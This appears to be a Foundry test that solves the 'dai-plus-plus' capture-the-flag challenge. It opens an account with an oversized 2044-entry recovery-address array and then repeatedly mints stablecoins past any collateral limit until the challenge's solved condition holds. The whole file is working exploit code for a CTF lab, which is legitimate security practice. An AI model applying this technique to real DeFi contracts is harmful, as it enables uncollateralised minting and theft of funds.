// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "../src/dai-plus-plus/Challenge.sol";
import "../src/dai-plus-plus/AccountManager.sol";
import "../src/dai-plus-plus/Stablecoin.sol";
import "../src/dai-plus-plus/SystemConfiguration.sol";
import {Account as Acct} from "../src/dai-plus-plus/Account.sol";

contract DaiPlusPlusTest is Test {
    Challenge challenge;
    SystemConfiguration configuration;
    AccountManager manager;

    function setUp() public {
        configuration = new SystemConfiguration();
        manager = new AccountManager(configuration);

        configuration.updateAccountManager(address(manager));
        configuration.updateStablecoin(address(new Stablecoin(configuration)));
        configuration.updateAccountImplementation(address(new Acct()));
        configuration.updateEthUsdPriceFeed(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);

        configuration.updateSystemContract(address(manager), true);
        challenge = new Challenge(configuration);
    }

    function test_daiplusplus() public {
        // 创建一个超长的recoveryAddresses数组
        address[] memory recoveryAddresses = new address[](2044);

        // 打开一个新账户
        Acct account = manager.openAccount(address(this), recoveryAddresses);

        // 铸造大量稳定币
        uint256 targetSupply = 1_000_000_000_000 ether;
        while (IERC20(configuration.getStablecoin()).totalSupply() < targetSupply) {
            manager.mintStablecoins(account, 1_000_000_000_0000 ether, "exploit");
        }
        isSolved();
    }

    function isSolved() public view {
        if (challenge.isSolved()) {
            console.log("Challenge is solved");
        } else {
            console.log("Challenge is not solved");
        }
    }
}
